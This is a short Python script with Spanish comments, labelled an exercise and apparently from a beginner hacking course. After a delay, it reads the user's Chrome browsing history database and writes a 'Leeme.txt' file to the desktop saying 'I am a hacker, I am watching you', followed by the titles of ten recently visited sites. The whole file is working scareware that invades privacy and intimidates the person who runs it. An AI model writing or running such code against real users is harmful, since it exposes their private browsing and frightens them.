# Ejercicio , abrir un txt en el escritorio de ordenador
import os 
# Agregar un tiempo de espera para escribir el archivo
from pathlib import Path
from time import sleep
from random import randrange
#Importando la libreria de sqlite
import sqlite3

FILE_NAME = "Leeme.txt"

def get_user_path():
    return "{}/".format(Path.home())
    
    
def deley_action():
    # Esperar una cantidad de horas antes de ejecutar
    number_hours = randrange(1,4)
    print("Durmiendo {} horas".format(number_hours))
    print("Historial Inaccesible, Reintentando ...")
    sleep(number_hours)
    # * 60 * 60


def create_file(user_path):
     # Crear archivo en escritorio
    file = open(user_path + "Desktop/" + FILE_NAME, "w")
     # Mensaje en el archivo
    file.write("Soy un hacker, te observo. \n")
    return file
    

def get__chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            connection  = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            sleep(3)
        


def  check_history_and_scare_user(file, chrome_history):
    for item in chrome_history[:10]:
        file.write("He visto que has visitado la web de {}, interesante...\n".format(item[0]))
        

def main ():
    # Esperar una cantidad de horas antes de ejecutar
    deley_action()
    # Obtener la ruta del escritorio
    user_path = get_user_path()
    # Crear Archivo
    file = create_file(user_path)
    #Recoger el Historial del chrome
    chrome_history = get__chrome_history(user_path)
    check_history_and_scare_user(file, chrome_history)
        
    
if __name__ == '__main__':
    main()